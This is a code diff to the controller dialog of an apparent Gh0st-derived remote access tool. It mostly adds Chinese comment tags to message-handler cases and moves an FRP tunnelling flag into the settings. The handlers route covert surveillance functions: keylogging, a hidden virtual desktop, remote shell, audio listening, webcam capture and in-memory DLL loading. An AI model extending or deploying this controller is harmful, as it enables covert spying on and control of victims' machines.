@@ -1009,7 +1009,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	}
 	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
 	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
-	m_settings = { m, sizeof(void*) == 8, __DATE__, n };
+	int usingFRP = master.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
+	m_settings = { m, sizeof(void*) == 8, __DATE__, n, usingFRP };
 	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
 	std::string str = myMap[n];
 	LVCOLUMN lvColumn;
@@ -1037,11 +1038,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	ShowMessage("使用提示", tip);
 
 #ifdef _WIN64
-	if (!master.empty()) {
-		int use = THIS_CFG.GetInt("frp", "UseFrp");
-		if (use) {
-			m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);
-		}
+	if (usingFRP) {
+		m_hFRPThread = CreateThread(NULL, 0, StartFrpClient, this, NULL, NULL);
 	}
 #endif
 
@@ -1966,10 +1964,11 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 	}
 	unsigned cmd = ContextObject->InDeCompressedBuffer.GetBYTE(0);
 	unsigned len = ContextObject->InDeCompressedBuffer.GetBufferLen();
-
+	// 【L】：主机上下线和授权
+	// 【x】：对话框相关功能
 	switch (cmd)
 	{
-	case TOKEN_GETVERSION: // 获取版本
+	case TOKEN_GETVERSION: // 获取版本【L】
 	{
 		// TODO 维持心跳
 		bool is64Bit = ContextObject->InDeCompressedBuffer.GetBYTE(1);
@@ -1983,7 +1982,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		SAFE_DELETE_ARRAY(resp);
 		break;
 	}
-	case CMD_AUTHORIZATION: // 获取授权
+	case CMD_AUTHORIZATION: // 获取授权【L】
 	{
 		int n = ContextObject->InDeCompressedBuffer.GetBufferLength();
 		if (n < 100) break;
@@ -2024,7 +2023,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		Sleep(20);
 		break;
 	}
-	case CMD_EXECUTE_DLL: // 请求DLL
+	case CMD_EXECUTE_DLL: // 请求DLL（执行代码）【L】
 	{
 		DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
 		for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i){
@@ -2038,15 +2037,15 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		Sleep(20);
 		break;
 	}
-	case COMMAND_PROXY:
+	case COMMAND_PROXY:// 代理映射【x】
 	{
 		g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_HEARTBEAT: case 137:
+	case TOKEN_HEARTBEAT: case 137: // 心跳【L】
 		UpdateActiveWindow(ContextObject);
 		break;
-	case SOCKET_DLLLOADER: {// 请求DLL
+	case SOCKET_DLLLOADER: {// 请求DLL【L】
 		auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
 		bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
 		int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
@@ -2063,95 +2062,95 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 		SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
 		break;
 	}
-	case COMMAND_BYE: // 主机下线
+	case COMMAND_BYE: // 主机下线【L】
 		{
 			CancelIo((HANDLE)ContextObject->sClientSocket);
 			closesocket(ContextObject->sClientSocket); 
 			Sleep(10);
 			break;
 		}
-	case TOKEN_DRAWING_BOARD:
+	case TOKEN_DRAWING_BOARD:// 远程画板【x】
 	{
 		g_2015RemoteDlg->SendMessage(WM_OPENDRAWINGBOARD, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_DRIVE_LIST_PLUGIN: // 文件管理
+	case TOKEN_DRIVE_LIST_PLUGIN: // 文件管理【x】
 	{
 		g_2015RemoteDlg->SendMessage(WM_OPENFILEMGRDIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面
+	case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面【x】
 		g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_SYSINFOLIST: { // 主机管理
+	case TOKEN_SYSINFOLIST: { // 主机管理【x】
 		g_2015RemoteDlg->SendMessage(WM_OPENMACHINEMGRDLG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_CHAT_START: { // 远程交谈
+	case TOKEN_CHAT_START: { // 远程交谈【x】
 		g_2015RemoteDlg->SendMessage(WM_OPENCHATDIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_DECRYPT: { // 解密数据
+	case TOKEN_DECRYPT: { // 解密数据【x】
 		g_2015RemoteDlg->SendMessage(WM_OPENDECRYPTDIALOG, 0, (LPARAM)ContextObject);
 		break;
 	}
-	case TOKEN_KEYBOARD_START: {// 键盘记录
+	case TOKEN_KEYBOARD_START: {// 键盘记录【x】
 			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_LOGIN: // 上线包
+	case TOKEN_LOGIN: // 上线包【L】
 		{
 			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
 			break;
 		}
-	case TOKEN_BITMAPINFO: // 远程桌面
+	case TOKEN_BITMAPINFO: // 远程桌面【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_DRIVE_LIST: // 文件管理
+	case TOKEN_DRIVE_LIST: // 文件管理【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_TALK_START: // 发送消息
+	case TOKEN_TALK_START: // 发送消息【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SHELL_START: // 远程终端
+	case TOKEN_SHELL_START: // 远程终端【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WSLIST:  // 窗口管理
-	case TOKEN_PSLIST:  // 进程管理
+	case TOKEN_WSLIST:  // 窗口管理【x】
+	case TOKEN_PSLIST:  // 进程管理【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_AUDIO_START: // 语音监听
+	case TOKEN_AUDIO_START: // 语音监听【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_REGEDIT: // 注册表管理
+	case TOKEN_REGEDIT: // 注册表管理【x】
 		{                            
 			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_SERVERLIST: // 服务管理
+	case TOKEN_SERVERLIST: // 服务管理【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头【x】
 		{
 			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
-	case CMD_PADDING: {
+	case CMD_PADDING: { // 随机填充
 		Mprintf("Receive padding command '%s' [%d]: Len=%d\n", ContextObject->PeerName.c_str(), cmd, len);
 		break;
 	}
